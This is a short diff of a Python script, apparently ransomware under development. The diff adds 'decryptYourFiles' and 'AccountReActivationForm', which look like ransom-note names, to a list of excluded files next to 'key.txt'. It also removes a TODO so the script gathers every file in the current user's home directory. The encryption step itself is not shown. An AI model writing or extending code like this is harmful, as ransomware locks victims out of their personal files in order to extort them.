@@ -10,11 +10,12 @@ excluded_files = {
     "key.txt",
     "README.md",
     ".gitignore",
+    "AccountReActivationForm",
+    "decryptYourFiles",
 }
 
 files = []
 
-# TODO: change this dir to the home for the current user
 home_dir = os.path.expanduser("~")
 
 for root, dirs, filenames in os.walk(home_dir):
